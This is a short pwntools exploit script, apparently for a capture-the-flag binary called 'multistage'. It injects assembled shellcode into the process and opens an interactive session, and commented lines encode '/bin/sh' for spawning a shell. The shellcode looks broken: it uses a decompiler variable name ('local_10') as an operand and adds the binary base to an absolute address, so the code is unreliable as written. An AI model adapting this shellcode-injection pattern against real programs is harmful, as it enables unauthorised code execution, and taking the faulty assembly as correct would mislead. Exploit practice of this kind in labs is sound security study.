from pwn import *
from time import sleep

elf = ELF('./multistage')
p = elf.process()

context.arch = 'amd64'

# mov rdi, 0x0068732f6e69622f
# mov edi, 0xe69622f
# push rdi
shellcode = f'''
mov [rbp + local_10], 0x{(elf.address + 0x00401227):x}
jmp rax
'''

log.info(f'shellcode: {shellcode}')
log.info(f'shellcode len: {len(asm(shellcode))}')

log.info(p.clean())
p.sendline(asm(shellcode))
# sleep(5)
log.info(p.clean())
p.interactive()